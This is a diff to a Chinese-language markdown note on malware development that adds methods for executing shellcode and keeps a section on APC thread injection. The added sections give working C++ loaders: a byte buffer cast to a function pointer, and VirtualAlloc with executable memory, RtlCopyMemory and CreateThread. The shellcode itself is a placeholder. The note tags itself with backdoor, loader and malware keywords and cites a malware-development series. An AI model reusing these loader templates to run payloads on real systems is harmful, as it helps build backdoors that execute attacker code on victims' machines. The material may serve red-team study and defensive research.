@@ -1,7 +1,46 @@
-# APC线程注入
+# 执行shellcode
 
-keywords: shellcode backdoor  
+keywords: backdoor loader 恶意软件  
 
+使用各种方法执行shellcode  
+
+
+## 作为函数直接调用
+```cpp
+#include <stdio.h>
+
+int main() {
+	unsigned char buf[] ="\x11\x22";
+
+	void(*func)();
+	func = (void(*)())&buf;
+	func();
+
+	return 0;
+}
+```
+
+
+## 使用CreateThread
+```cpp
+#include <stdio.h>
+#include <Windows.h>
+
+int main() {
+	unsigned char buf[] = "\x11\x22";
+
+	PVOID shellcode_exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	RtlCopyMemory(shellcode_exec, buf, sizeof(buf));
+	DWORD threadID;
+	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
+	WaitForSingleObject(hThread, INFINITE);
+
+	return 0;
+}
+```
+
+
+## APC线程注入
 APC, Asynchronous Procedure Calls, 异步过程调用，在特定线程的上下文中异步执行函数  
 这些函数可以触发异步执行函数调用：  
 ```r
@@ -54,8 +93,12 @@ int main()
 }
 ```
 
-来源: 初九_9 https://www.bilibili.com/video/BV1Km4y1Z73g  
-APC介绍: https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls  
+
+## 参考链接
+1. https://0xpat.github.io/Malware_development_part_1
+2. 初九_9 https://www.bilibili.com/video/BV1Km4y1Z73g
+3. APC介绍: https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
 
 
+---
 2022/2/15  
